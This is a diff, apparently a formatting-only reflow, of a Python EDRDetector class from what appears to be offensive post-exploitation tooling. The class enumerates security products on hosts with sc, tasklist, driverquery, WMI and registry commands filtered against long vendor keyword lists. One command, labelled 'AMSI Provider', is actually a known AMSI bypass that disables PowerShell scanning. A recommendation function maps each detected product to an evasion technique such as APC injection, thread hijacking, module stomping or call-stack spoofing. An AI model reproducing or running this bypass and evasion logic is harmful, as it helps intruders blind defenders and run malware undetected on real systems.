@@ -230,43 +230,61 @@ class EDRDetector:
         commands = []
 
         if remote_type in ("wmi", "smb"):
-            commands.append({
-                "name": "WMI AntivirusProduct",
-                "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState,pathToSignedProductExe /format:list",
-            })
-            commands.append({
-                "name": "WMI AntispywareProduct",
-                "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName,pathToSignedProductExe /format:list",
-            })
+            commands.append(
+                {
+                    "name": "WMI AntivirusProduct",
+                    "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState,pathToSignedProductExe /format:list",
+                }
+            )
+            commands.append(
+                {
+                    "name": "WMI AntispywareProduct",
+                    "command": "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName,pathToSignedProductExe /format:list",
+                }
+            )
 
-        commands.append({
-            "name": "Running Services (Security)",
-            "command": 'sc query state= all | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
-        })
-        commands.append({
-            "name": "Running Processes (Security)",
-            "command": 'tasklist /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr falcon"',
-        })
-        commands.append({
-            "name": "Loaded Drivers (Security)",
-            "command": 'driverquery /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
-        })
-        commands.append({
-            "name": "Registry — Installed Products",
-            "command": r'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
-        })
-        commands.append({
-            "name": "Registry — 32-bit Installed",
-            "command": r'reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex"',
-        })
-        commands.append({
-            "name": "Defender Status",
-            "command": "powershell -c \"Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled | Format-List\"",
-        })
-        commands.append({
-            "name": "AMSI Provider (PowerShell)",
-            "command": "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
-        })
+        commands.append(
+            {
+                "name": "Running Services (Security)",
+                "command": 'sc query state= all | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
+            }
+        )
+        commands.append(
+            {
+                "name": "Running Processes (Security)",
+                "command": 'tasklist /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr falcon"',
+            }
+        )
+        commands.append(
+            {
+                "name": "Loaded Drivers (Security)",
+                "command": 'driverquery /v | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
+            }
+        )
+        commands.append(
+            {
+                "name": "Registry — Installed Products",
+                "command": r'reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex bitdefender kaspersky eset malwarebytes fireeye fortiedr"',
+            }
+        )
+        commands.append(
+            {
+                "name": "Registry — 32-bit Installed",
+                "command": r'reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s 2>nul | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex"',
+            }
+        )
+        commands.append(
+            {
+                "name": "Defender Status",
+                "command": 'powershell -c "Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,AntispywareEnabled,BehaviorMonitorEnabled | Format-List"',
+            }
+        )
+        commands.append(
+            {
+                "name": "AMSI Provider (PowerShell)",
+                "command": "powershell -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
+            }
+        )
 
         return commands
 
@@ -275,7 +293,9 @@ class EDRDetector:
         try:
             result = subprocess.run(
                 ["tasklist", "/fo", "csv", "/nh"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             return [line.split(",")[0].strip('"').lower() for line in result.stdout.splitlines() if line.strip()]
         except Exception:
@@ -286,7 +306,9 @@ class EDRDetector:
         try:
             result = subprocess.run(
                 ["sc", "query", "state=", "all"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             services = []
             for line in result.stdout.splitlines():
@@ -301,7 +323,9 @@ class EDRDetector:
         try:
             result = subprocess.run(
                 ["driverquery", "/fo", "csv", "/nh"],
-                capture_output=True, text=True, timeout=10,
+                capture_output=True,
+                text=True,
+                timeout=10,
             )
             return [line.split(",")[0].strip('"').lower() for line in result.stdout.splitlines() if line.strip()]
         except Exception:
@@ -331,12 +355,14 @@ class EDRDetector:
 
             if matches:
                 confidence = "high" if len(matches) >= 2 else "medium"
-                findings.append(EDRFinding(
-                    product=product,
-                    confidence=confidence,
-                    source="+".join(matches),
-                    details=f"Found: {', '.join(matches)}",
-                ))
+                findings.append(
+                    EDRFinding(
+                        product=product,
+                        confidence=confidence,
+                        source="+".join(matches),
+                        details=f"Found: {', '.join(matches)}",
+                    )
+                )
 
         return findings
 
@@ -363,7 +389,9 @@ class EDRDetector:
             recommendations.append("reflective_dll — Avoid disk-write detection by SentinelOne static scanner")
 
         if any("carbon" in p for p in product_names):
-            recommendations.append("early_bird — APC injection before process initialization (CB watches CreateProcess)")
+            recommendations.append(
+                "early_bird — APC injection before process initialization (CB watches CreateProcess)"
+            )
             recommendations.append("thread_hijack — Hijack existing thread to avoid CbDefense process hooks")
 
         if any("cylance" in p for p in product_names):
@@ -384,7 +412,9 @@ class EDRDetector:
 
         if any("cortex" in p for p in product_names):
             recommendations.append("module_stomping — Overwrite loaded DLL .text section")
-            recommendations.append("call_stack_spoofing — Spoof return addresses to bypass Cortex thread stack analysis")
+            recommendations.append(
+                "call_stack_spoofing — Spoof return addresses to bypass Cortex thread stack analysis"
+            )
 
         if len(profile.detected) >= 2:
             recommendations.append("multi_layer — Combine 2+ techniques (e.g., syscall + encryption + unhook)")
